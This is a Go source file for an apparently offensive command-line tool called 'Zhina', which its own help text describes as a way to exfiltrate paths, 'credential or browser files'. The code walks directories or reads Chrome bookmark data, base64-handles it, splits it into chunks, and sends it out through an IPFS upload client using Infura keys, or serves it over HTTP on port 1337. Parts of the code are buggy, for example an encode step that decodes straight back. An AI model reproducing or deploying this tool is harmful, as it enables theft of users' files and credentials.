package main

import (
	"bytes"
	"encoding/base64"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"math"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"time"

	"github.com/spf13/pflag"
	"github.com/spf13/viper"
)

const applicationName string = "Zhina"
const applicationVersion string = "v1.0"

type output struct {
	out []byte
	err error
}

var (
	myDevice        string
	platform        string
	project_id      string
	api_secret_key  string
	doEncode        bool
	doEncodeForTest bool
	slice1M         bool
	simple          bool
	ipfs            bool
)

func init() {
	flag.String("config", "config.yaml", "Configuration file: /path/to/file.yaml, default = ./config.yaml")
	flag.String("path", "", "Path to Exfiltrate")
	flag.String("do", "", "encode64")
	flag.String("slice", "", "slice1M")
	flag.String("serve", "", "simple, ipfs")
	flag.Bool("debug", false, "Display debugging information")
	flag.Bool("displayconfig", false, "Display configuration")
	flag.Bool("help", false, "Display help")
	flag.Bool("version", false, "Display version information")
	flag.Bool("all", false, "For all devices")
	flag.String("device", "", "What device to query, (default: \"all\")")
	pflag.CommandLine.AddGoFlagSet(flag.CommandLine)
	pflag.Parse()
	err := viper.BindPFlags(pflag.CommandLine)
	checkErr(err)

	if viper.GetBool("help") {
		displayHelp()
		os.Exit(0)
	}

	if viper.GetBool("version") {
		fmt.Println(applicationName + " " + applicationVersion)
		os.Exit(0)
	}

	configdir, configfile := filepath.Split(viper.GetString("config"))

	// set default configuration directory to current directory
	if configdir == "" {
		configdir = "."
	}

	viper.SetConfigType("yaml")
	viper.AddConfigPath(configdir)

	config := strings.TrimSuffix(configfile, ".yaml")
	config = strings.TrimSuffix(config, ".yml")

	viper.SetConfigName(config)

	if err := viper.ReadInConfig(); err != nil {
		if _, ok := err.(viper.ConfigFileNotFoundError); ok {
			log.Fatal("Config file not found")
		} else {
			log.Fatal("Config file was found but another error was discovered: ", err)
		}
	}

	if viper.GetBool("displayconfig") {
		displayConfig()
		os.Exit(0)
	}

	if viper.GetString("slice") != "" {
		command := viper.GetString("slice")
		split := strings.Split(command, ",")
		//fmt.Println(split[0])

		for i := 0; i < len(split); i++ {
			if split[i] == "slice1M" {
				slice1M = true
			}
		}

	}

	if viper.GetString("serve") != "" {
		command := viper.GetString("serve")
		split := strings.Split(command, ",")
		//fmt.Println(split[0])

		for i := 0; i < len(split); i++ {
			if split[i] == "simple" {
				simple = true
			} else {
				ipfs = true
			}
		}

	}

	if viper.GetString("do") != "" {
		command := viper.GetString("do")
		split := strings.Split(command, ",")
		//fmt.Println(split[0])

		for i := 0; i < len(split); i++ {
			if split[i] == "encode64" {
				doEncode = true
			}
		}

	}

	if viper.GetBool("all") || (len(viper.GetString("device")) == 0) {
		// if "--all" or if default is used, assume "all"
		myDevice = "all"
	} else {

		// check that the device exists
		if _, ok := viper.GetStringMap("infura")[viper.GetString("infura")]; ok {
			myDevice = viper.GetString("infura")
		} else {
			// device isn't found

			// check if user has manually set "--device all"
			if strings.EqualFold(viper.GetString("device"), "all") {
				myDevice = "all"

			} else {
				// exit out saying device not found
				fmt.Printf("Device %s does not exist, exiting\n", viper.GetString("device"))
				os.Exit(1)
			}
		}

	}

}

func main() {

	if runtime.GOOS == "windows" {
		platform = "windows"
	} else if runtime.GOOS == "darwin" {
		platform = "macos"
	} else {
		platform = "linux"
	}

	displayDevices()

	if viper.GetString("path") != "" {
		pathToExfiltrate(viper.GetString("path"))

	} else {
		displayHelp()
	}

}

// checks errors
func checkErr(err error) {
	if err != nil {
		log.Fatal(err)
	}
}

// split
func splitforexf(path string) {

}

// decrypts the return message
func decrypt(ciphertext []byte) string {
	n := len(ciphertext)
	key := byte(0xAB)
	var nextKey byte
	for i := 0; i < n; i++ {
		nextKey = ciphertext[i]
		ciphertext[i] = ciphertext[i] ^ key
		key = nextKey
	}
	return string(ciphertext)
}

func encoded64(plainStr []byte) []byte {

	// The encoder we will use is the base64.StdEncoding
	// It requires a byte slice so we cast the string to []byte
	encodedStr := base64.StdEncoding.EncodeToString([]byte(plainStr))
	//fmt.Println(encodedStr)

	// Decoding may return an error, in case the input is not well formed
	decodedStrAsByteSlice, err := base64.StdEncoding.DecodeString(encodedStr)
	if err != nil {
		panic("malformed input")
	}
	//fmt.Println(string(decodedStrAsByteSlice))

	return ([]byte(decodedStrAsByteSlice))

}

func SimpleHTTPServe(port string) {
	fmt.Println("[+] Readed")
	fmt.Printf("[+] Serving HTTP on 0.0.0.0 port %s ...\n", port)
	h := http.FileServer(http.Dir("."))
	http.ListenAndServe(":"+port, h)
}

func pathToExfiltrate(path string) {

	user, err := user.Current()
	if err != nil {
		log.Fatalf(err.Error())
	}

	username := user.Username

	if path == "browser" {

		//fmt.Println(platform)

		if path == "browser" {
			if platform == "macos" {
				content, err := ioutil.ReadFile("/Users/" + username + "/Library/Application Support/Google/Chrome/Default/Bookmarks")

				if err != nil {
					log.Fatal(err)
				}

				//fmt.Println(string(content))
				ioutil.WriteFile("./tmp/Browser", encoded64(content), 0644)

				ch := make(chan output)

				if ipfs {
					go func() {

						if platform == "macos" {
							cmd := exec.Command("ipfs-client/ipfs-upload-client-mac", "--id", project_id, "--secret", api_secret_key, "./tmp/e32750923746273654214e68721")
							out, err := cmd.CombinedOutput()
							ch <- output{out, err}
						} else if platform == "windows" {
							cmd := exec.Command("ipfs-client/ipfs-upload-client.exe", "--id", project_id, "--secret", api_secret_key, path)
							out, err := cmd.CombinedOutput()
							ch <- output{out, err}
						} else {
							cmd := exec.Command("ipfs-client/ipfs-upload-client", "--id", project_id, "--secret", api_secret_key, path)
							out, err := cmd.CombinedOutput()
							ch <- output{out, err}
						}

					}()

					select {
					case <-time.After(2 * time.Second):
						fmt.Println("[-] timed out")
					case x := <-ch:
						fmt.Printf("[+] program done; out: %q\n", string(x.out))
						if x.err != nil {
							fmt.Printf("[-] program errored: %s\n", x.err)
						}
					}

				} else {
					SimpleHTTPServe("1337")
				}

				//ch := make(chan output)
			}

		} else {
		}
	} else {

		//Display and code for read dir and files

		displayDevices()

		var files []string

		root := path
		err := filepath.Walk(root, func(path string, info os.FileInfo, err error) error {

			fileInfo, err := os.Stat(path)
			if err != nil {
				// error handling
			}

			if fileInfo.IsDir() {
				// is a directory
			} else {
				files = append(files, path)
				return nil
			}

			return nil

		})
		if err != nil {
			panic(err)
		}

		for _, file := range files {
			//fmt.Println(file)
			content, err := ioutil.ReadFile(file)

			if err != nil {
				log.Fatal(err)
			}

			cmd := exec.Command("echo")

			ch := make(chan output)

			if slice1M {
				ioutil.WriteFile("./tmp/e32750923746273654214e68721", encoded64(content), 0644)

				file, err := os.Open("./tmp/e32750923746273654214e68721")

				if err != nil {
					fmt.Println(err)
					os.Exit(1)
				}

				defer file.Close()

				fileInfo, _ := file.Stat()

				var fileSize int64 = fileInfo.Size()

				const fileChunk = 1 * (1 << 20) // 1 MB, change this to your requirement

				totalPartsNum := uint64(math.Ceil(float64(fileSize) / float64(fileChunk)))

				//fmt.Printf("Splitting to %d pieces.\n", totalPartsNum)

				for i := uint64(0); i < totalPartsNum; i++ {

					partSize := int(math.Min(fileChunk, float64(fileSize-int64(i*fileChunk))))
					partBuffer := make([]byte, partSize)

					file.Read(partBuffer)

					fileName := "./tmp/e32750923746273654214e68721_" + strconv.FormatUint(i, 10)
					_, err := os.Create(fileName)

					if err != nil {
						fmt.Println(err)
						os.Exit(1)
					}

					ioutil.WriteFile(fileName, partBuffer, os.ModeAppend)

					//fmt.Println("Split to : ", fileName)
				}

			}

			if doEncode {

				fmt.Println("[+] Encoded!")

				ioutil.WriteFile("./tmp/e32750923746273654214e68721", encoded64(content), 0644)

				if ipfs {
					go func() {

						if platform == "macos" {
							cmd := exec.Command("ipfs-client/ipfs-upload-client-mac", "--id", project_id, "--secret", api_secret_key, "./tmp/e32750923746273654214e68721")
							out, err := cmd.CombinedOutput()
							ch <- output{out, err}
						} else if platform == "windows" {
							cmd := exec.Command("ipfs-client/ipfs-upload-client.exe", "--id", project_id, "--secret", api_secret_key, path)
							out, err := cmd.CombinedOutput()
							ch <- output{out, err}
						} else {
							cmd := exec.Command("ipfs-client/ipfs-upload-client", "--id", project_id, "--secret", api_secret_key, path)
							out, err := cmd.CombinedOutput()
							ch <- output{out, err}
						}

					}()

					select {
					case <-time.After(2 * time.Second):
						fmt.Println("[-] timed out")
					case x := <-ch:
						fmt.Printf("[+] program done; out: %q\n", string(x.out))
						if x.err != nil {
							fmt.Printf("[-] program errored: %s\n", x.err)
						}
					}
				} else {
					SimpleHTTPServe("1337")
				}

				os.Remove("e32750923746273654214e6872")
			} else {

				if ipfs {
					go func() {
						if platform == "macos" {
							cmd := exec.Command("ipfs-client/ipfs-upload-client-mac", "--id", project_id, "--secret", api_secret_key, "./tmp/e32750923746273654214e68721")
							out, err := cmd.CombinedOutput()
							ch <- output{out, err}
						} else if platform == "windows" {
							cmd := exec.Command("ipfs-client/ipfs-upload-client.exe", "--id", project_id, "--secret", api_secret_key, path)
							out, err := cmd.CombinedOutput()
							ch <- output{out, err}
						} else {
							cmd := exec.Command("ipfs-client/ipfs-upload-client", "--id", project_id, "--secret", api_secret_key, path)
							out, err := cmd.CombinedOutput()
							ch <- output{out, err}
						}

					}()

					select {
					case <-time.After(2 * time.Second):
						fmt.Println("[-] timed out")
					case x := <-ch:
						fmt.Printf("[+] program done; out: %q\n", string(x.out))
						if x.err != nil {
							fmt.Printf("[-] program errored: %s\n", x.err)
						}
					}
				} else {
					SimpleHTTPServe("1337")
				}

			}

			var out bytes.Buffer
			cmd.Stdout = &out

			errr := cmd.Run()

			if errr != nil {
				log.Fatal(err)
			}

			//fmt.Printf(out.String())

		}
	}

}

// displays help information
func displayHelp() {
	message := `


B##B#######BBBBBBBBBBBBBB##############B#######B##BBBBB##BB################&&&###########&##BB######
B#BB#######BBBBBBBBBBBBBBB############BB#####BBBBBGGBBBBBB###########&###&&&&&#######&&&&&###BBBBBB#
BBBBBBB####BBBBBBBBBBBBGBBBBBBB#B############BBBBBBBB##BBBB#####&&&&#####&&######&&&&&&&&&&###BB####
BBBBBB########BBBBBBBBBBBGGBBBB##############BBBB######BBBB######&&#############&&&&&&&&&&&&##&#####
BBBBBB##########BBBBBBBBBBBB##########BBBBBBBBBB##########B######&############&######&&&&&&&&&&#####
BBBBB##########B####BBBBBBB#####BBB##BBBBBBBBBBBB#########BBB###&&####################&&&&&&&&&#####
BBBB#########BBBBBBBBBB##BBBBB####BBBBBBBBBBBBBB##BBBBBBBBBBB######################&&#&&&&&&&#######
BBBB########BBBBBBBBBB###BB#######BB###BBBBBBBBB###BBBBB#############################&&&&&&#######BB
BBBB#####BBBBBBBBBBBBB###BB############BBBBBBBBB###BBBBB###################BBB#######&############BB
####BB###B##BBBBB########BB#BB############BBBBBBBBBBBBBB#############################&############B#
GBB#BBGGBBB###BB########B###BB###BBBB##BB#BGBBBBBB#########BB####################################BBB
PPPPPPPPPPPPG#BBB#BBBBBBB###BBBBBBBB##BB##BBBBBBB#########BB######BBBB###########################BBB
5Y5PPPPPPPPP5G##B##BBBBBBB##BBBBB###BBBBBBBBBBB5?G##################BB#B##############BB#######BBBBB
PPPPPPPPP5PPPPB#B##BBBBBBGGGBBB####BBBBBBBBBGPJ!~?B################BB#####BBB################BBB####
PPPPPYYYY5PPPPPBBB#BBBBBBGGGGBBB##BBGBBBBP5J7!~!!!!JPB############BBBB#######BB####&#######BB#######
PPPP55555PPP5PPPG###BBBBBBBBBBBBB#####GP?!~~~~~~~~~~~7YG#######B####BBBB###BBBB#####&######BBB###&&&
PPP555555PP5YYYY5PGB#BBB#########B#BG5?!~~~^^^^^^^^~~~~!JB###########BBBBBBB###B###############&&&&#
PP5Y5Y555PPPP555555GBGGGBBBBB##BB#P?!!~~^^^^^^^^^^~~~~~~~J###########BBB##############&&#######BBBGG
PP555555PPPPPP55555PBBGGGBGGBB#BB#J!!~~~~~~~~~~~~~~~~~~~~7B#################################BGPYJJYP
PPP55PPPPPPP55555555PGGBBBBBBBBBBBPJJJ?7!~~~~!7????777!!~?GP##################BBB##########GPPPPP55P
PPPP55PP5YY?JY5555555555PGBBBBB##GPYYYY5J!~~!7JJJJJJJJ????PJJB########B#B####B############GPPPPPPPPP
PPPPPPPP5555555555555555YYPBBBBBBBGPYYPYJ^^^~7!?YJJ5P5P5J7?5JP#############BBBB##########BPYYY5PPPPP
PPPPPPPPPPPP555555555555YYY5PGBBBP7777?7!^^^~~^~?77JJJJ?7~~!?G#B###############BBBB####BGPP5555PP5PP
PPPPPPPPPPP555555555555555YYYYGBB?~~~~~~^:^^~^^^^~~~~~~~~~~!!?PBB############B##B###BGP5PPPP5PYYY55P
PPPPPPPPPPP5555555555555YYYYYYG#G!~~~~~~^^^~!!~^^^^^^^~~~!!77?JY5GB##############GP5YYY5P5555555Y555
PPPPPPP5555555555555555YYYYYYYPGG?!~^~77!77~~!7~^^^^^~~!77??JJJ?7?JYYB###BBBB###B55YY55PPP55555PP555
PPPPPP55555555555555555Y5555YYYY5J7!~~~7???77!!^^^^^~!7?????J???7777YBBBBBBBBBB#G555555YJJJJ55PP5555
PPPPPP55555555555555555555Y55YYYYJJ7!~~!!!~~~^^^^^~!!7????????7!!75G#BBBBBBBBBBG5555555Y555555555555
PPP55P55555555555555555555YYYYYYYYYJ!!JYYYYJJJJ?!!!!!!!!!!!!!!!~!YB#BBBBBGGGGGP555555555555555555555
PPP55P55555555555555555555555YYYYYYJ?~~!?????7!~~~~~~~^~^~^^^~~~?PBBBBBGPP55555555555555555555555555
PPPPPPP555555555555555555555555YYYYYJ~^^^~~~^^^^^^~~^^^^^^^^^^~7YG##BGP55555555555555555555555555555
PPPPP5555555555555555555555555Y5YYYYY?:^^:::::^^^^^^^^^^^^^^~!7?JBBBP5555555555555555555555555555555
PPPPP55555555555555555555555555Y5YYYYY~::::^^^^^~~^~~~~~!!777??77PBPY5555555555555555555555555555555
PPPPPP5PP55555555555555555555555YYYYYYY!^^^^^~!!777??????7777!!!!?GYYY555555555555555555555555555555
PPPPP5PPP5555555555555555555555555YYYYY5YJJJJ????777777!!!!!!~~~~~7YYYY5555555555555555555P555555555
PPPPPP555555555555555555555555555555YYYYYYYY?7777!!!!~~~~~~~~~~~~!~!J55555555555555555555PP555555555
PPPPPPP555P5555555555555555555555555YYYYYYYY77!!~~~~~^^^^^^^^~~~~~~~~7Y55555555555555555555555555555
PPPPPPPP555555555555555555555555555YYYYYYYYJ~~~^^^^^^^^^^^^^^^^~~~~~~~!7Y555Y55555555555555555555555
PPPPPPP55555555555555555555555555555555YYYYJ!~^^^^^^^^^^^^^^^^^^^^^^^^~^~7Y5YY5555555555555555555555
PPPPPPP5555555555555555555555YYYYYYYYYY55YYYYJ?7!~^^^^:::::::::::::::^^^::^!J55555555555555555555555
PPPPP5555555555555555555555YYYYYYYYYYYYYY55YYYYYYYYJJ??7777!!!!!!77??????7?JYYYYY5555555555555555555
PPPPP55555555555555555555555555YYYYYYYY555YYYYYYYYYYYYYYYYYYYYYYYYYYYYJYYYYYYYYYYYY55555555555555555
PPPP5PP555555555555555555555555YYYY555555YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY5555555555555555
PPPPPPP5555555555555555555555555Y555555555555555YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY5YYY55555555555
PPPPPPPP5PP5555555555555555555555555555555555555Y5YYYYYY555YYYYYY5555555555555YYY55555555YY5555YYY55
PPPPPPPPP55555555555555555YY55YY555555555555555555YYYYYYYYYYYYYYYY5555555555555555555555555YY555YY55
PPPPPPPP555P55555555555555YY5555555555555YYYYYYYYYYYYYJJJYYYYYYYY5555555555555555555555555555555YY55
PPPPPPPP55P5?JYP5555555555YYYYYYYYYYYYYYJJJJJJJYJJJJJJJJJJJJYYYYYY5555555555555555555555555555555555
PPPPPPPP5PPYJJ5555YYYYYYYYYYYYJJJ??JJJJJ????JJJJJJJJJJJJJJJJJJJJYY5555555555555555555555555555555555
PPPPPPPPPPP?JPP555YYYYJJJYYYJJJ???????????????J???????JJJJJJJJJJJYYYYYY55555555555555555555555555555
PPPPPPPPPPY7?PP555555YJJJJJJJJJJJJJ????JJJJJJJJJJJJJJJJJJJJJJJJJJJJYYYYYYY5555YY5555PP55555555555555
PPPPPPPPP5J75P55PPPP55YY5555YJJJJJJYYYYYYYJYYYYYYYYYYYYJJJJJJJJJJJJYYYYY55555YYYY5555PPP55555555P555
PPPPPPPPPJ!?PP5PPPPPPP555PPP555YYYYYYYYYYYYYYYYYYYYYYYYYYYYYJJJJJYYYYYY5555555555555555P5P5555PPPPP5
PPPPPPPPP5?5PPPPPPPPPPPPPPPPPPP5555555555555555YY55555555555YYYYY55555555555555555PPPPPPPPP55PPPPPPP
PPPPPPPPPPGPPPPPPPPPPPPPPPPPPPPP55555555PP555555555555555555555555555PPPP555555PPPPPPPPPPPPPPPPPPPPP


      --config [file]       Configuration file: /path/to/file.yaml (default: "./config.yaml")
      --path [path]         Path to Exfiltrate or Known Good Stuf for exfiltrate like credential or browser files
	  --do <action>         encode64
      --slice <action>      slice64 
	  --debug               Display debug information
      --displayconfig       Display configuration
      --help                Display help
      --version             Display version
	 
	  Example:
	  zhina --path [path]
	  zhina --path browser 
	  zhina --path path --do encode64
	  zhina --path path --slice slice64 
	  zhina --path path --serve simple,ipfs

	 
	 
	  `
	fmt.Println(applicationName + " " + applicationVersion)
	fmt.Println(message)
}

func displayConfig() {
	allmysettings := viper.AllSettings()
	var keys []string
	for k := range allmysettings {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	for _, k := range keys {
		fmt.Println("[+] CONFIG:", k, ":", allmysettings[k])
	}
}

func displayDevices() {
	if viper.IsSet("infura") {
		for k, v := range viper.GetStringMap("infura") {
			//fmt.Printf("%s     %s\n", k, v)
			if k == "project_id" {
				if str, ok := v.(string); ok {
					project_id = str
				} else {
					/* not string */
				}

			} else if k == "api_secret_key" {
				if str, ok := v.(string); ok {
					api_secret_key = str
				} else {
					/* not string */
				}

			}
		}
	} else {
		fmt.Println("[-] Error!")
	}
}
